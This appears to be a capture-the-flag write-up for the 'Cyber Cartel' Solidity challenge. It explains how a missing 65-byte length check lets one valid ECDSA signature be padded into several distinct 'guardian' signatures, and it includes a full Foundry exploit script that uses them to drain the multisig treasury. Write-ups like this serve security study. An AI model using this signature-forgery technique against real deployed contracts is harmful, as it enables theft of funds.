# Cyber Cartel

Author: JesJupyter ([X/Twitter](https://x.com/jesjupyter))

## Background

## Introduction
Malone, Wiz and Box recently robbed a billionaire and deposited their proceeds into a multisig treasury. And who is Box? The genius hacker behind everything. He's gonna rob his friends...


### ECDSA signing

In Ethereum and Solidity, digital signatures play a crucial role in verifying the authenticity of transactions and messages. These signatures stem from the ECDSA algorithm and are typically 65 bytes long and follow a specific structure known as the "Signature of Solidity."

The 65-byte signature is composed of three parts:

1. r (32 bytes): The first 32 bytes of the signature, representing the x-coordinate of the ephemeral public key.
2. s (32 bytes): The next 32 bytes, representing the signature proof.
3. v (1 byte): The final byte, used for recovery of the signer's public key.

The signature scheme used in Ethereum is based on the Elliptic Curve Digital Signature Algorithm (ECDSA) with the secp256k1 curve.

To extract r, s, and v from a signature in Solidity:

we can refer to the following Solidity Code in [Solidity by Example](https://solidity-by-example.org/signature/)

```solidity
    function splitSignature(bytes memory sig)
        public
        pure
        returns (bytes32 r, bytes32 s, uint8 v)
    {
        require(sig.length == 65, "invalid signature length");

        assembly {
            /*
            First 32 bytes stores the length of the signature

            add(sig, 32) = pointer of sig + 32
            effectively, skips first 32 bytes of signature

            mload(p) loads next 32 bytes starting at the memory address p into memory
            */

            // first 32 bytes, after the length prefix
            r := mload(add(sig, 32))
            // second 32 bytes
            s := mload(add(sig, 64))
            // final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(sig, 96)))
        }

        // implicitly return (r, s, v)
    }
```


## Analysis

### How to attack the `CartelTreasury`

To attack the `CartelTreasury` by draining all the funds, there are some relevant functions.

```solidity
    function doom() external guarded {
        payable(msg.sender).transfer(address(this).balance);
    }
    /// Dismiss the bodyguard
    function gistCartelDismiss() external guarded {
        bodyGuard = address(0);
    }    
```

Since `doom()` will send all funds to `msg.sender` which is the `bodyGuard`, we can't rely on it directly to drain all the funds.

Instead, since `gistCartelDismiss()` will set `bodyGuard` to `address(0)`, which means we can first call `gistCartelDismiss()` to dismiss the `bodyguard`, call `initialize()` to reset the `bodyGuard` back to `msg.sender`, and then call `doom()` to drain all the funds.

So, the steps to drain all the funds are:

1. Call `gistCartelDismiss()` from `bodyGuard` to dismiss the `bodyguard`.
2. Call `initialize()` to reset the `bodyGuard` back to `msg.sender`.
3. Call `doom()` to drain all the funds.

### How to let `bodyGuard` to call `gistCartelDismiss`

We can only rely on `bodyGuard` to call `gistCartelDismiss()` since `bodyGuard` is a trusted address. The only external call to `CartelTreasury` is in the function `propose` in `Bodyguard`.

```solidity
    function propose(Proposal memory proposal, bytes[] memory signatures) external {
        require(proposal.expiredAt > block.timestamp, "Expired");
        require(proposal.nonce > lastNonce, "Invalid nonce");

        uint256 minVotes_ = minVotes;
        if (guardians[msg.sender]) {
            minVotes_--;
        }

        require(minVotes_ <= signatures.length, "Not enough signatures");
        require(validateSignatures(hashProposal(proposal), signatures), "Invalid signatures");

        lastNonce = proposal.nonce;

        uint256 gasToUse = proposal.gas;
        if (gasleft() < gasToUse) {
            gasToUse = gasleft();
        }

        (bool success,) = treasury.call{gas: gasToUse * 9 / 10}(proposal.data);
        if (!success) {
            revert("Execution failed");
        }
    }
```

So the problem changes to how can we bypass the `validateSignatures` check in `propose` since only `msg.sender`(only 1 guardian) will not be enough to get `minVotes_`.

```solidity
    function validateSignatures(bytes32 digest, bytes[] memory signaturesSortedBySigners) public view returns (bool) {
        bytes32 lastSignHash = bytes32(0); // ensure that the signers are not duplicated

        for (uint256 i = 0; i < signaturesSortedBySigners.length; i++) {
            address signer = recoverSigner(digest, signaturesSortedBySigners[i]);
            require(guardians[signer], "Not a guardian");

            bytes32 signHash = keccak256(signaturesSortedBySigners[i]);
            if (signHash <= lastSignHash) {
                return false;
            }

            lastSignHash = signHash;
        }

        return true;
    }
    function recoverSigner(bytes32 digest, bytes memory signature) public pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(digest, v, r, s);
    }   
```

When we compare the `recoverSigner` with the example code we provided above, we notice `signature` length is not compared against 65 bytes. But `signHash` is calculated from the entire `signature` which could actually be longer than 65 bytes.

So, when we already have 1 valid 65 bytes signature, we can append more bytes to it to make it longer than 65 bytes and we can still generate the same `r`, `s`, `v` in `recoverSigner`. By doing so, we can forge multiple signatures from 1 valid one and pass the `validateSignatures` check.

### CTF Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Challenge} from "../src/Challenge.sol";
import "../src/CyberCartel.sol";
import "../src/Challenge.sol";

contract TestScript is Script {


    function run() public {
        Challenge challenge = Challenge(CHALLENGE_ADDRESS);
        uint256 deployerPrivateKey =  PRIVATE_KEY;
        address user = vm.addr(deployerPrivateKey);
        vm.startBroadcast(deployerPrivateKey);

        CartelTreasury cartel = CartelTreasury(payable(challenge.TREASURY()));
        BodyGuard bodyGuard = BodyGuard(cartel.bodyGuard());
        
        // create a proposal to call `gistCartelDismiss` and generate signatures
        BodyGuard.Proposal memory proposal = BodyGuard.Proposal({
            expiredAt: uint32(block.timestamp) + 100,
            gas: 100000,
            nonce: 200,
            data: abi.encodeWithSelector(CartelTreasury.gistCartelDismiss.selector)
        });

        // Hash the proposal
        bytes32 proposalHash = bodyGuard.hashProposal(proposal);

        // Generate signature
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, proposalHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Get minVotes from bodyGuard, we set it to 5 for convenience
        uint8 minVotes = 5;

        // Generate an array of bytes with length equal to minVotes
        bytes[] memory signatures = new bytes[](minVotes);

        // Fill the array with signatures
        for (uint8 i = 0; i < minVotes; i++) {
            // Append a byte to the signature to make it unique
            bytes memory uniqueSignature = abi.encodePacked(signature, bytes1(i));
            signatures[i] = uniqueSignature;
        }

        // Sort the signatures array based on keccak256 hash
        for (uint8 i = 0; i < minVotes - 1; i++) {
            for (uint8 j = 0; j < minVotes - i - 1; j++) {
                if (keccak256(signatures[j]) > keccak256(signatures[j + 1])) {
                    bytes memory temp = signatures[j];
                    signatures[j] = signatures[j + 1];
                    signatures[j + 1] = temp;
                }
            }
        }

        bodyGuard.propose(proposal, signatures);
        cartel.initialize(user);
        cartel.doom();
        challenge.isSolved();

        vm.stopBroadcast();
    }
}

```










